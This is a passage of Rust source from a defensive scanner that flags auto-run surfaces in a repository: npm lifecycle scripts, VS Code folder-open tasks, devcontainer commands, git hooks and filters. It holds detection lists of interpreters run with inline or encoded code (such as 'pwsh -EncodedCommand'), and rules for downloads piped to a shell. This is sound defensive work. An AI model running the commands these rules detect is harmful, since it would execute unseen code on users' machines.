//! Auto-run surfaces: install scripts, editor tasks, devcontainers, build files, git config
//! (Task 9).
//!
//! `surfaces` reads one file as data and never runs anything. It returns the commands the file
//! starts by itself (a [`Surface`] each, rated later by the orchestrator from trigger and shape)
//! and pushes into `out` the findings that need no command: a setting that redirects a tool, a
//! wrapper that downloads from another host, a git hook. A file that holds surfaces also gets one
//! INFO `autorun.inventory` finding.
//!
//! Rules of the surfaces: `autorun.npm-lifecycle`, `autorun.npm-start-data`,
//! `autorun.vscode-folder-open`, `autorun.devcontainer-host`, `autorun.build-script`,
//! `autorun.envrc`, `autorun.pre-commit-hook`, `autorun.husky-hook`, `autorun.justfile`,
//! `autorun.taskfile`, `autorun.msbuild-exec` and `autorun.setup-py` (every `setup.py`, an
//! Install surface). A tasks, settings or devcontainer file the JSONC
//! reader rejects gives `autorun.unparsed` (MEDIUM): the editor may read what this cannot.
//!
//! Two functions are for the orchestrator to call outside `surfaces`: `entry_findings` once with
//! the path of every tree entry (git hooks, which must count even as a symlink; it also lowers
//! an `autorun.vscode-program` finding whose target is not in the tree), and
//! `raise_gitattributes_filters` for every text file and every git hook file (a filter that
//! another file tells you to configure; a stock hook stub).
//!
//! Every name is matched without regard to ASCII case, as macOS and Windows resolve it.

use std::collections::{BTreeSet, HashMap, HashSet};
use std::rc::Rc;
use std::sync::LazyLock;

use anthology_pycompat::json::{Map, Value};
use regex::{Captures, Regex};

use crate::shape::{self, Shape};
use crate::{FileCtx, Finding, Group, Severity, Surface, Trigger, jsonc, tomlish};

const READ_FIRST: &str =
    "Read this file before you open the folder in an editor or run an install.";

/// Scans one file. See the module docs.
pub(crate) fn surfaces(f: &FileCtx, out: &mut Vec<Finding>) -> Vec<Surface> {
    let path = f.path;
    if by_presence(path, out) {
        return Vec::new();
    }
    // A file the decoder could not read as clean text is read lossily: a stray byte must not
    // hide what the file runs.
    let lossy;
    let text = match f.text {
        Some(t) => t,
        None => {
            lossy = String::from_utf8_lossy(f.bytes);
            &*lossy
        }
    };
    let mut cx = Cx {
        path,
        text,
        out,
        found: Vec::new(),
        notes: Vec::new(),
    };
    // Every name is matched in lower case: macOS and Windows find a file by a name in any case.
    let lower = path.to_ascii_lowercase();
    let name = base(&lower);
    let in_dir = base(parent(&lower));
    if name == "package.json" {
        if !lower.split('/').any(|c| c == "node_modules") {
            package_json(&mut cx);
        }
    } else if name == "tasks.json" && matches!(in_dir, ".vscode" | ".cursor") {
        vscode_tasks(&mut cx);
    } else if name == "settings.json" && in_dir == ".vscode" {
        vscode_settings(&mut cx);
    } else if name.ends_with(".code-workspace") {
        code_workspace(&mut cx);
    } else if name == ".devcontainer.json"
        || (name == "devcontainer.json" && dir_above(path, ".devcontainer").is_some())
    {
        devcontainer(&mut cx);
    } else if matches!(name, "makefile" | "gnumakefile" | "configure")
        || name.ends_with(".mk")
        || name.ends_with(".m4")
    {
        build_script(&mut cx);
    } else if name == ".envrc" {
        shell_surfaces(&mut cx, "autorun.envrc", false);
    } else if name == ".pre-commit-config.yaml" {
        pre_commit(&mut cx);
    } else if let Some(root) = dir_above(path, ".husky") {
        if lower[root.len()..]
            .trim_start_matches('/')
            .starts_with(".husky/_/")
        {
            // What husky writes there is not the repo's own hook; a changed file is.
            if !husky_stock(name, text) {
                shell_surfaces(&mut cx, "autorun.husky-hook", false);
            }
        } else {
            shell_surfaces(&mut cx, "autorun.husky-hook", false);
        }
    } else if matches!(name, "justfile" | ".justfile") {
        shell_surfaces(&mut cx, "autorun.justfile", true);
    } else if matches!(name, "taskfile.yml" | "taskfile.yaml") {
        taskfile(&mut cx);
    } else if name.ends_with(".csproj") || name.ends_with(".props") || name.ends_with(".targets") {
        msbuild(&mut cx);
    } else if name == "setup.py" {
        setup_py(&mut cx);
    } else if name == "pyproject.toml" {
        pyproject(&mut cx);
    } else if path_is(path, ".cargo/config.toml") || path_is(path, ".cargo/config") {
        cargo_config(&mut cx);
    } else if name == "rust-toolchain.toml" || name == "rust-toolchain" {
        rust_toolchain(&mut cx);
    } else if path_is(path, "gradle/wrapper/gradle-wrapper.properties") {
        wrapper_properties(
            &mut cx,
            "autorun.gradle-wrapper",
            &["distributionUrl"],
            "services.gradle.org",
        );
    } else if path_is(path, ".mvn/wrapper/maven-wrapper.properties") {
        wrapper_properties(
            &mut cx,
            "autorun.maven-extensions",
            &["distributionUrl", "wrapperUrl"],
            "repo.maven.apache.org",
        );
    } else if name == ".gitmodules" {
        gitmodules(&mut cx);
    } else if name == ".gitattributes" {
        gitattributes(&mut cx);
    } else if path_is(path, ".git/config") || path_is(path, ".git/config.worktree") {
        git_config(&mut cx);
    } else if name == ".npmrc" {
        npmrc(&mut cx);
    } else if name == ".yarnrc.yml" || name == ".yarnrc" {
        yarn_path(&mut cx);
    }
    let Cx {
        out, found, notes, ..
    } = cx;
    if !found.is_empty() {
        out.push(inventory(path, &found, &notes));
    }
    found
}

/// The `(name, command)` pairs of the `scripts` of a `package.json`, in file order. A script whose
/// value is not a string is left out; a file that does not parse gives none.
pub(crate) fn npm_scripts(f: &FileCtx) -> Vec<(String, String)> {
    f.text
        .and_then(|t| jsonc::parse(t).ok())
        .map(|v| script_pairs(&v))
        .unwrap_or_default()
}

fn script_pairs(v: &Value) -> Vec<(String, String)> {
    let Some(scripts) = v
        .as_object()
        .and_then(|o| o.get("scripts"))
        .and_then(Value::as_object)
    else {
        return Vec::new();
    };
    scripts
        .iter()
        .filter_map(|(k, v)| Some((k.to_string(), v.as_str()?.to_string())))
        .collect()
}

/// Raises each `autorun.gitattributes-filter` finding to HIGH when `f` is a text file (not the
/// attributes file itself) that tells the reader to set up one of its filters with
/// `git config filter.<name>.…`. The orchestrator calls this for every text file once the
/// attributes finding exists. It is also offered every git hook file, and lowers the finding of
/// a stock hook stub (`lower_hook_stubs`).
pub(crate) fn raise_gitattributes_filters(f: &FileCtx, findings: &mut [Finding]) {
    lower_hook_stubs(f, findings);
    let Some(text) = f.text else {
        return;
    };
    if !text.contains("filter.") || !text.contains("git") {
        return;
    }
    let configured: BTreeSet<&str> = GIT_CONFIG_FILTER
        .captures_iter(text)
        .filter_map(|c| c.get(1).map(|m| m.as_str()))
        .collect();
    if configured.is_empty() {
        return;
    }
    for finding in findings.iter_mut() {
        if finding.rule != "autorun.gitattributes-filter"
            || finding.severity >= Severity::High
            || finding.path == f.path
        {
            continue;
        }
        let hit = finding.seen.split(' ').find(|n| configured.contains(n));
        if let Some(name) = hit {
            finding.severity = Severity::High;
            finding.why = format!(
                "A text file in the repo tells you to run git config for the filter {name}, \
                 so a command from the repo runs whenever git checks files in or out."
            );
        }
    }
}

static GIT_CONFIG_FILTER: LazyLock<Regex> = LazyLock::new(|| {
    Regex::new(r"git\s+config\s+(?:--?[\w-]+\s+)*filter\.([^\s.=]+)\.").expect("pattern compiles")
});

// What the rules share.

struct Cx<'a> {
    path: &'a str,
    text: &'a str,
    out: &'a mut Vec<Finding>,
    found: Vec<Surface>,
    /// Facts about the file for its inventory finding.
    notes: Vec<String>,
}

impl Cx<'_> {
    fn surface(
        &mut self,
        rule: &'static str,
        trigger: Trigger,
        command: &str,
        line: usize,
        dir: &str,
        floor: Severity,
    ) {
        let command = command.trim();
        if command.is_empty() {
            return;
        }
        self.found.push(Surface {
            path: self.path.to_string(),
            line,
            trigger,
            command: command.to_string(),
            rule,
            floor,
            dir: dir.to_string(),
        });
    }

    fn find(
        &mut self,
        severity: Severity,
        rule: &str,
        line: usize,
        why: &str,
        seen: &str,
        action: &str,
    ) {
        self.out
            .push(finding(self.path, severity, rule, line, why, seen, action));
    }

    /// The file runs code on open or install and is JSON the reader could not parse. That is
    /// HIGH: the tool that runs it may read what this cannot (a stray byte, padding, a cap). The
    /// raw text is then scanned for the commands the file would start.
    fn unparsed(&mut self, error: &str, kind: Raw) {
        self.find(
            Severity::High,
            "autorun.unparsed",
            0,
            "This file runs code when the folder is opened or the package installed, and it \
             could not be read as JSON with comments. The tool that runs it may read more than \
             the scan can, so what it starts is unknown. The commands found in its raw text \
             are listed.",
            error,
            READ_FIRST,
        );
        raw_surfaces(self, kind);
    }
}

/// What a file that does not parse is read as.
#[derive(Clone, Copy)]
enum Raw {
    Package,
    Tasks,
    Devcontainer,
    /// Runs nothing itself; the failure alone is the finding.
    Settings,
}

/// At most this many surfaces come from the raw text of one file.
const MAX_RAW_SURFACES: usize = 500;

static JSON_STRING: LazyLock<Regex> =
    LazyLock::new(|| Regex::new(r#""((?:[^"\\]|\\.)*)""#).expect("pattern compiles"));

/// The text of a JSON string body, with its escapes decoded when it reads as one.
fn json_unescape(body: &str) -> String {
    jsonc::parse(&format!("\"{body}\""))
        .ok()
        .and_then(Value::into_string)
        .unwrap_or_else(|| body.to_string())
}

/// The strings inside a window of raw JSON, decoded.
fn json_strings(window: &str) -> Vec<String> {
    JSON_STRING
        .captures_iter(window)
        .take(MAX_RAW_SURFACES)
        .map(|c| json_unescape(&c[1]))
        .collect()
}

/// From a `[` or `{` at the start of `s` to its match, cut at 4,000 bytes. Strings are not
/// skipped: this reads text that does not parse.
fn value_window(s: &str) -> &str {
    let mut depth = 0usize;
    let mut end = s.len().min(4000);
    for (i, b) in s.bytes().enumerate().take(4000) {
        match b {
            b'[' | b'{' => depth += 1,
            b']' | b'}' => {
                depth = depth.saturating_sub(1);
                if depth == 0 {
                    return &s[..=i];
                }
            }
            _ => {}
        }
    }
    while !s.is_char_boundary(end) {
        end -= 1;
    }
    &s[..end]
}

/// For each `"key":` in raw JSON text: the byte offset of its value and the command it holds. A
/// string is one command; an array of strings is one command line; every string in an object is
/// a command.
fn raw_values(text: &str, key: &str) -> Vec<(usize, String)> {
    let needle = format!("\"{key}\"");
    let mut out = Vec::new();
    let mut pos = 0;
    while out.len() < MAX_RAW_SURFACES
        && let Some(i) = text[pos..].find(&needle)
    {
        let after = pos + i + needle.len();
        pos = after;
        let Some(rest) = text[after..].trim_start().strip_prefix(':') else {
            continue;
        };
        let rest = rest.trim_start();
        let start = text.len() - rest.len();
        match rest.as_bytes().first() {
            Some(b'"') => {
                if let Some(m) = JSON_STRING
                    .captures(rest)
                    .filter(|c| c.get(0).is_some_and(|w| w.start() == 0))
                {
                    out.push((start, json_unescape(&m[1])));
                }
            }
            Some(b'[') => {
                let words = json_strings(value_window(rest));
                if !words.is_empty() {
                    out.push((start, join_args(&words)));
                }
            }
            Some(b'{') => out.extend(
                json_strings(value_window(rest))
                    .into_iter()
                    .map(|s| (start, s)),
            ),
            _ => {}
        }
    }
    out
}

/// Surfaces read from the raw text of a file that did not parse: the values of the keys that
/// start commands, and every line whose text is a download or decode piped to a shell, or a
/// program run on a data file.
fn raw_surfaces(cx: &mut Cx, kind: Raw) {
    let text = cx.text;
    let path = cx.path;
    let (rule, trigger, dir, keys): (&'static str, Trigger, String, &[&str]) = match kind {
        Raw::Package => (
            "autorun.npm-lifecycle",
            Trigger::Install,
            parent(path).to_string(),
            &[
                "preinstall",
                "install",
                "postinstall",
                "prepare",
                "prepublish",
                "prepack",
                "start",
                "dev",
            ],
        ),
        Raw::Tasks => (
            "autorun.vscode-folder-open",
            Trigger::Open,
            parent(parent(path)).to_string(),
            &["command"],
        ),
        Raw::Devcontainer => (
            "autorun.devcontainer-host",
            Trigger::Open,
            parent(path).to_string(),
            &["initializeCommand"],
        ),
        Raw::Settings => return,
    };
    // Tasks that do not run on folder open are not a surface.
    if matches!(kind, Raw::Tasks) && !text.contains("folderOpen") && !text.contains("\\u") {
        return;
    }
    // Byte offset, command, and the rule, trigger and floor it is rated under.
    let mut commands: Vec<(usize, String, &'static str, Trigger, Severity)> = Vec::new();
    for key in keys {
        let (rule, trigger, floor) = match kind {
            Raw::Package => match npm_rule(key) {
                Some(r) => r,
                None => continue,
            },
            _ => (rule, trigger, Severity::Info),
        };
        for (at, command) in raw_values(text, key) {
            // `start` and `dev` only count when they run a data file.
            if floor == Severity::High && shape::classify(&command) != Shape::RunsData {
                continue;
            }
            commands.push((at, command, rule, trigger, floor));
        }
    }
    let mut offset = 0;
    for line in text.split('\n') {
        if matches!(
            shape::classify(line),
            Shape::FetchExec | Shape::DecodeExec | Shape::RunsData
        ) {
            commands.push((
                offset,
                line.trim().to_string(),
                rule,
                trigger,
                Severity::Info,
            ));
        }
        offset += line.len() + 1;
    }
    commands.sort_by_key(|c| c.0);
    let (mut line, mut pos) = (1, 0);
    for (at, command, rule, trigger, floor) in commands.into_iter().take(MAX_RAW_SURFACES) {
        let at = at.min(text.len());
        line += text.as_bytes()[pos..at]
            .iter()
            .filter(|b| **b == b'\n')
            .count();
        pos = at;
        if !cx.found.iter().any(|s| s.command == command) {
            cx.surface(rule, trigger, &command, line, &dir, floor);
        }
    }
}

fn finding(
    path: &str,
    severity: Severity,
    rule: &str,
    line: usize,
    why: &str,
    seen: &str,
    action: &str,
) -> Finding {
    Finding {
        severity,
        group: Group::Autorun,
        rule: rule.to_string(),
        path: path.to_string(),
        line,
        why: why.to_string(),
        seen: seen.to_string(),
        action: action.to_string(),
        count: 1,
    }
}

fn inventory(path: &str, found: &[Surface], notes: &[String]) -> Finding {
    let mut rules: Vec<&str> = Vec::new();
    for s in found {
        if !rules.contains(&s.rule) {
            rules.push(s.rule);
        }
    }
    let mut why = format!(
        "{} command{} in this file run by themselves ({}).",
        found.len(),
        if found.len() == 1 { "" } else { "s" },
        rules.join(", ")
    );
    for note in notes {
        why.push(' ');
        why.push_str(note);
    }
    let mut f = finding(
        path,
        Severity::Info,
        "autorun.inventory",
        0,
        &why,
        "",
        READ_FIRST,
    );
    f.count = found.len();
    f
}

/// The findings that need only the path of a tree entry, not its content: `autorun.git-hooks`
/// (HIGH) for every entry under `.git/hooks/`, in the tree's own `.git` folder or a nested one,
/// whose name does not end in `.sample`. The orchestrator calls this once with the path of every
/// entry of the tree, so a hook that is a symlink (whatever it points at) or cannot be read counts
/// too; `surfaces` does not repeat it. `lower_hook_stubs` then lowers a stock installer stub.
pub(crate) fn entry_findings(paths: &[&str], out: &mut Vec<Finding>) {
    for path in paths {
        let Some(hook) = git_hook_name(path) else {
            continue;
        };
        if hook.is_empty() || ends_with_ci(hook, ".sample") {
            continue;
        }
        out.push(finding(
            path,
            Severity::High,
            "autorun.git-hooks",
            0,
            "A git hook ships inside the repo's .git folder; git runs it on commit, checkout, \
             merge and push.",
            hook,
            "Do not run git in this folder. Read the hook first.",
        ));
    }
    lower_program_settings(paths, out);
}

/// Lowers an `autorun.vscode-program` finding from HIGH to LOW when the path it names, from the
/// workspace folder, is not an entry of the tree (a file, or a folder with something in it): the
/// editor then has nothing of the repo's to run, unless an install or build step creates it.
fn lower_program_settings(paths: &[&str], findings: &mut [Finding]) {
    let mut tree: Option<HashSet<String>> = None;
    for f in findings.iter_mut() {
        if f.rule != "autorun.vscode-program" || f.severity != Severity::High {
            continue;
        }
        let Some((_, value)) = f.seen.split_once(" = ") else {
            continue;
        };
        let target = workspace_target(value, workspace_base(&f.path)).unwrap_or_default();
        let tree = tree.get_or_insert_with(|| {
            let mut names = HashSet::new();
            for p in paths {
                let lower = p.to_ascii_lowercase();
                for (i, _) in lower.rmatch_indices('/') {
                    names.insert(lower[..i].to_string());
                }
                names.insert(lower);
            }
            names
        });
        if !tree.contains(&target.to_ascii_lowercase()) {
            f.severity = Severity::Low;
            f.why = "An editor setting names a path inside the repo, but nothing in the tree is \
                     at that path, so the editor has no program of the repo's to run unless an \
                     install or build step creates it."
                .to_string();
        }
    }
}

/// The name of the hook at `path` when it is an entry of a `.git/hooks` folder.
fn git_hook_name(path: &str) -> Option<&str> {
    const HEAD: &str = ".git/hooks/";
    // A folder name in any ASCII case is the same folder; the offsets of the lower-cased copy fit.
    if path.len() <= HEAD.len() {
        return None;
    }
    let lower = path.to_ascii_lowercase();
    let at = if lower.starts_with(HEAD) {
        HEAD.len()
    } else {
        lower.find("/.git/hooks/")? + 1 + HEAD.len()
    };
    Some(&path[at..])
}

/// True when `path` is a hook file `entry_findings` rates.
pub(crate) fn is_git_hook(path: &str) -> bool {
    git_hook_name(path).is_some_and(|h| !h.is_empty() && !ends_with_ci(h, ".sample"))
}

/// Lowers `autorun.git-hooks` to LOW for the file `f` when it is the stock stub that pre-commit,
/// git-lfs or lefthook writes. The orchestrator offers each text file once the entry findings
/// exist. A stub that has been edited, or any other hook, stays HIGH.
pub(crate) fn lower_hook_stubs(f: &FileCtx, findings: &mut [Finding]) {
    let Some(hook) = git_hook_name(f.path) else {
        return;
    };
    let Some(finding) = findings
        .iter_mut()
        .find(|x| x.rule == "autorun.git-hooks" && x.path == f.path)
    else {
        return;
    };
    let lossy;
    let text = match f.text {
        Some(t) => t,
        None => {
            lossy = String::from_utf8_lossy(f.bytes);
            &*lossy
        }
    };
    if let Some(tool) = known_stub(hook, text) {
        finding.severity = Severity::Low;
        finding.why = format!(
            "The hook is the stock stub {tool} writes, line for line. An edited stub would be \
             HIGH."
        );
    }
}

static PRE_COMMIT_ID: LazyLock<Regex> =
    LazyLock::new(|| Regex::new(r"^# ID: [0-9a-f]{32}$").expect("pattern compiles"));
/// The Python line of a pre-commit stub: an absolute path, quoted when it needs it.
static PRE_COMMIT_PYTHON: LazyLock<Regex> = LazyLock::new(|| {
    Regex::new(r"^INSTALL_PYTHON=(/[\w@%+=:,./-]*|'/[^'$`\\]*')$").expect("pattern compiles")
});
/// The arguments line: the default config only, a hook type, and the skip flag.
static PRE_COMMIT_ARGS: LazyLock<Regex> = LazyLock::new(|| {
    Regex::new(
        r"^ARGS=\(hook-impl --config=\.pre-commit-config\.yaml --hook-type=[a-z][a-z-]*( --skip-on-missing-config)?\)$",
    )
    .expect("pattern compiles")
});

/// True for a `INSTALL_PYTHON=` line of a pre-commit stub that names an interpreter the machine
/// installed: an absolute path with no `.` or `..` part, whose last part is `python` or `pypy`
/// with a version, outside the folders anyone can write to or that name a process's own files.
fn pre_commit_python_ok(line: &str) -> bool {
    if !PRE_COMMIT_PYTHON.is_match(line) {
        return false;
    }
    let value = line
        .trim_start_matches("INSTALL_PYTHON=")
        .trim_matches('\'');
    let mut parts = value.split('/').skip(1);
    let last = value.rsplit('/').next().unwrap_or("");
    let version = last
        .strip_prefix("python")
        .or_else(|| last.strip_prefix("pypy"))
        .is_some_and(|v| v.chars().all(|c| c.is_ascii_digit() || c == '.'));
    version
        && !parts.any(|p| matches!(p, "." | ".."))
        && !["/proc/", "/dev/", "/tmp/", "/var/tmp/", "/run/", "/sys/"]
            .iter()
            .any(|dir| value.starts_with(dir))
}
/// The guard line git-lfs writes: older versions with `echo`, newer ones with `printf` and a
/// longer message.
static LFS_GUARD: LazyLock<Regex> = LazyLock::new(|| {
    Regex::new(concat!(
        r#"^command -v git-lfs >/dev/null 2>&1 \|\| \{ (?:"#,
        r#"echo >&2 "[^"`$|&<>]*""#,
        r#"|printf >&2 "\\n%s\\n\\n" "[^"`$|&<>]*""#,
        r#"); exit 2; \}$"#,
    ))
    .expect("pattern compiles")
});

/// The lines pre-commit writes besides its three variable lines.
const PRE_COMMIT_LINES: &[&str] = &[
    "#!/usr/bin/env bash",
    "# File generated by pre-commit: https://pre-commit.com",
    "# start templated",
    "# end templated",
    "HERE=\"$(cd \"$(dirname \"$0\")\" && pwd)\"",
    "ARGS+=(--hook-dir \"$HERE\" -- \"$@\")",
    "if [ -x \"$INSTALL_PYTHON\" ]; then",
    "    exec \"$INSTALL_PYTHON\" -mpre_commit \"${ARGS[@]}\"",
    "elif command -v pre-commit > /dev/null; then",
    "    exec pre-commit \"${ARGS[@]}\"",
    "else",
    "    echo '`pre-commit` not found.  Did you forget to activate your virtualenv?' 1>&2",
    "    exit 1",
    "fi",
];

/// The script husky 4.3.8 writes to `.git/hooks/husky.sh` after its three banner lines and a blank
/// line. Husky 4.2.5 and 4.3.0 to 4.3.5 differ in the two lines of `HUSKY4_ALTERNATES`; the
/// version line carries the installed version.
const HUSKY4_MAIN: &str = r##"debug () {
  if [ "$HUSKY_DEBUG" = "true" ] || [ "$HUSKY_DEBUG" = "1" ]; then
    echo "husky:debug $1"
  fi
}

command_exists () {
  command -v "$1" >/dev/null 2>&1
}

run_command () {
  if command_exists "$1"; then
    "$@" husky-run $hookName $gitParams

    exitCode="$?"
    debug "$* husky-run exited with $exitCode exit code"

    if [ $exitCode -eq 127 ]; then
      echo "Can't find Husky, skipping $hookName hook"
      echo "You can reinstall it using 'npm install husky --save-dev' or delete this hook"
    else
      exit $exitCode
    fi

  else
    echo "Can't find $1 in PATH: $PATH"
    echo "Skipping $hookName hook"
    exit 0
  fi
}

hookIsDefined () {
  grep -qs $hookName \
    package.json \
    .huskyrc \
    .huskyrc.json \
    .huskyrc.yaml \
    .huskyrc.yml
}

huskyVersion="0.0.0"
gitParams="$*"
hookName="$(basename "$0")"

debug "husky v$huskyVersion - $hookName"

# Skip if HUSKY_SKIP_HOOKS is set
if [ "$HUSKY_SKIP_HOOKS" = "true" ] || [ "$HUSKY_SKIP_HOOKS" = "1" ]; then
  debug "HUSKY_SKIP_HOOKS is set to $HUSKY_SKIP_HOOKS, skipping hook"
  exit 0
fi

# Source user var and change directory
. "$(dirname "$0")/husky.local.sh"
debug "Current working directory is $(pwd)"

# Skip fast if hookName is not defined
# Don't skip if .huskyrc.js or .huskyrc.config.js are used as the heuristic could
# fail due to the dynamic aspect of JS. For example:
# `"pre-" + "commit"` or `require('./config/hooks')`)
if [ ! -f .huskyrc.js ] && [ ! -f huskyrc.cjs ] && [ ! -f husky.config.js ] && [ ! -f husky.config.cjs ] && ! hookIsDefined; then
  debug "$hookName config not found, skipping hook"
  exit 0
fi

# Source user ~/.huskyrc
if [ -f ~/.huskyrc ]; then
  debug "source ~/.huskyrc"
  . ~/.huskyrc
fi

# Set HUSKY_GIT_STDIN from stdin
case $hookName in
  "pre-push"|"post-rewrite")
    export HUSKY_GIT_STDIN="$(cat)";;
esac

# Windows 10, Git Bash and Yarn 1 installer
if command_exists winpty && test -t 1; then
  exec < /dev/tty
fi

# Run husky-run with the package manager used to install Husky
case $packageManager in
  "npm") run_command npx --no-install;;
  "npminstall") run_command npx --no-install;;
  "pnpm") run_command pnpx --no-install;;
  "yarn") run_command yarn run --silent;;
  *) echo "Unknown package manager: $packageManager"; exit 0;;
esac"##;

/// Lines of `HUSKY4_MAIN` that older husky 4 versions wrote differently: the stock line, then the
/// older one.
const HUSKY4_ALTERNATES: &[(&str, &str)] = &[
    (
        "    \"$@\" husky-run $hookName $gitParams",
        "    \"$@\" husky-run $hookName \"$gitParams\"",
    ),
    (
        "if [ ! -f .huskyrc.js ] && [ ! -f huskyrc.cjs ] && [ ! -f husky.config.js ] && [ ! -f husky.config.cjs ] && ! hookIsDefined; then",
        "if [ ! -f .huskyrc.js ] && [ ! -f husky.config.js ] && ! hookIsDefined; then",
    ),
];

/// The lines simple-git-hooks writes before the command of a hook, the last one blank.
const SIMPLE_GIT_HOOKS_PRELUDE: &[&str] = &[
    "#!/bin/sh",
    "",
    "if [ \"$SKIP_SIMPLE_GIT_HOOKS\" = \"1\" ]; then",
    "    echo \"[INFO] SKIP_SIMPLE_GIT_HOOKS is set to 1, skipping hook.\"",
    "    exit 0",
    "fi",
    "",
    "if [ -f \"$SIMPLE_GIT_HOOKS_RC\" ]; then",
    "    . \"$SIMPLE_GIT_HOOKS_RC\"",
    "fi",
    "",
];

/// What a hook command of simple-git-hooks may call: a package runner, flags that name no file,
/// and a tool that lints or checks what is staged. Anything else (a script, another package, a
/// config file argument) is the repo's own code, so the hook stays HIGH.
const HOOK_RUNNERS: &[&str] = &["npx", "pnpx", "bunx", "pnpm", "yarn", "npm", "bun"];
const HOOK_RUNNER_WORDS: &[&str] = &["--no-install", "--yes", "-y", "exec", "run", "x"];
const HOOK_TOOLS: &[&str] = &[
    "lint-staged",
    "commitlint",
    "eslint",
    "prettier",
    "tsc",
    "pretty-quick",
    "stylelint",
    "jest",
    "vitest",
    "biome",
    "oxlint",
    "nano-staged",
];
const HOOK_ARGS: &[&str] = &[
    "--fix",
    "--staged",
    "--quiet",
    "-q",
    "--verbose",
    "--edit",
    "$1",
    "\"$1\"",
    "$@",
    "\"$@\"",
];

/// True when `lines` are the prelude of simple-git-hooks and one command that calls a known tool.
fn simple_git_hooks_stub(lines: &[&str]) -> bool {
    let n = SIMPLE_GIT_HOOKS_PRELUDE.len();
    if lines.len() <= n || lines[..n] != *SIMPLE_GIT_HOOKS_PRELUDE {
        return false;
    }
    let mut command = lines[n..].iter().copied();
    let (Some(command), None) = (command.next(), command.find(|l| !l.is_empty())) else {
        return false;
    };
    let mut words = command.split_whitespace();
    let Some(first) = words.next() else {
        return false;
    };
    let tool = if HOOK_RUNNERS.contains(&first) {
        loop {
            match words.next() {
                Some(w) if HOOK_RUNNER_WORDS.contains(&w) => {}
                Some(w) => break w,
                None => return false,
            }
        }
    } else {
        first
    };
    HOOK_TOOLS.contains(&tool) && words.all(|w| HOOK_ARGS.contains(&w))
}

/// True when a shell line starts an interpreter with code on its command line (`node -e`,
/// `python -c`, `sh -c`, `perl -e`) or a module or file to load (`-m`, `-r`): code that no file
/// of the tree shows.
fn inline_code(line: &str) -> bool {
    const INTERPRETERS: &[&str] = &[
        "node",
        "nodejs",
        "deno",
        "bun",
        "perl",
        "ruby",
        "php",
        "lua",
        "sh",
        "bash",
        "zsh",
        "dash",
        "ksh",
        "pwsh",
        "powershell",
        "osascript",
        "awk",
        "gawk",
        "tclsh",
        "rscript",
    ];
    const FLAGS: &[&str] = &[
        "-e",
        "-E",
        "-c",
        "-r",
        "-p",
        "-m",
        "-M",
        "-x",
        "--eval",
        "--print",
        "--require",
        "--import",
        "--command",
        "-command",
        "-Command",
        "-enc",
        "-EncodedCommand",
    ];
    let mut words = line.split_whitespace().peekable();
    while let Some(w) = words.next() {
        let name = w
            .trim_matches(['"', '\''])
            .rsplit('/')
            .next()
            .unwrap_or("")
            .to_ascii_lowercase();
        let interpreter = INTERPRETERS.contains(&name.as_str())
            || name.starts_with("python")
            || name.starts_with("pypy");
        if interpreter && words.clone().any(|f| FLAGS.contains(&f)) {
            return true;
        }
    }
    false
}

/// A line of the husky 4 banner: the version line, and two comment lines.
fn husky4_banner(lines: &[&str]) -> bool {
    static VERSION: LazyLock<Regex> = LazyLock::new(|| {
        Regex::new(
            r"^# Created by Husky v\d+\.\d+\.\d+ \(https://github\.com/typicode/husky#readme\)$",
        )
        .expect("pattern compiles")
    });
    lines.len() == 3
        && VERSION.is_match(lines[0])
        && lines[1].starts_with("#   At: ")
        && lines[2].starts_with("#   From: ")
}

/// The stub husky 4 writes for a hook, `husky.sh` or `husky.local.sh` in `.git/hooks`: `name` is
/// the file's name, `lines` its lines without the trailing blank ones.
fn husky4_stub(name: &str, lines: &[&str]) -> bool {
    match name {
        "husky.sh" => {
            let stock: Vec<&str> = HUSKY4_MAIN.lines().collect();
            lines.len() == stock.len() + 4
                && husky4_banner(&lines[..3])
                && lines[3].is_empty()
                && lines[4..].iter().zip(&stock).all(|(got, want)| {
                    got == want
                        || HUSKY4_ALTERNATES
                            .iter()
                            .any(|(stock_line, older)| stock_line == want && older == got)
                        || (want.starts_with("huskyVersion=")
                            && got
                                .strip_prefix("huskyVersion=\"")
                                .and_then(|v| v.strip_suffix('"'))
                                .is_some_and(|v| {
                                    !v.is_empty()
                                        && v.chars().all(|c| c.is_ascii_digit() || c == '.')
                                }))
                })
        }
        "husky.local.sh" => {
            static CD: LazyLock<Regex> =
                LazyLock::new(|| Regex::new(r#"^cd "[\w./@ -]*"$"#).expect("pattern compiles"));
            lines.len() == 6
                && husky4_banner(&lines[..3])
                && lines[3].is_empty()
                && matches!(
                    lines[4],
                    "packageManager=npm"
                        | "packageManager=npminstall"
                        | "packageManager=pnpm"
                        | "packageManager=yarn"
                )
                && CD.is_match(lines[5])
                && !lines[5].contains("..")
        }
        _ => {
            lines.len() == 8
                && lines[0] == "#!/bin/sh"
                && lines[1] == "# husky"
                && lines[2].is_empty()
                && husky4_banner(&lines[3..6])
                && lines[6].is_empty()
                && lines[7] == ". \"$(dirname \"$0\")/husky.sh\""
        }
    }
}

/// The three files husky 9 writes under `.husky/_/` besides one stub per hook.
const HUSKY9_GITIGNORE: &str = "*";
const HUSKY9_HOOK: &[&str] = &["#!/usr/bin/env sh", ". \"$(dirname \"$0\")/h\""];
const HUSKY9_H: &str = r##"#!/usr/bin/env sh
[ "$HUSKY" = "2" ] && set -x
n=$(basename "$0")
s=$(dirname "$(dirname "$0")")/$n

[ ! -f "$s" ] && exit 0

if [ -f "$HOME/.huskyrc" ]; then
	echo "husky - '~/.huskyrc' is DEPRECATED, please move your code to ~/.config/husky/init.sh"
fi
i="${XDG_CONFIG_HOME:-$HOME/.config}/husky/init.sh"
[ -f "$i" ] && . "$i"

[ "${HUSKY-}" = "0" ] && exit 0

export PATH="node_modules/.bin:$PATH"
sh -e "$s" "$@"
c=$?

[ $c != 0 ] && echo "husky - $n script failed (code $c)"
[ $c = 127 ] && echo "husky - command not found in PATH=$PATH"
exit $c"##;
const HUSKY9_SH: &str = r##"echo "husky - DEPRECATED

Please remove the following two lines from $0:

#!/usr/bin/env sh
. \"\$(dirname -- \"\$0\")/_/husky.sh\"

They WILL FAIL in v10.0.0
""##;

/// True when `text` is a file husky 9 writes under `.husky/_/`, whose name (in lower case) is
/// `name`: `.gitignore`, `h`, `husky.sh` or the stub of a hook. Anything else there, or an edited
/// copy, is a hook of the repo.
fn husky_stock(name: &str, text: &str) -> bool {
    let mut lines: Vec<&str> = text.lines().map(str::trim_end).collect();
    while lines.last() == Some(&"") {
        lines.pop();
    }
    let same = |want: &str| lines.iter().copied().eq(want.lines());
    match name {
        ".gitignore" => same(HUSKY9_GITIGNORE),
        "h" => same(HUSKY9_H),
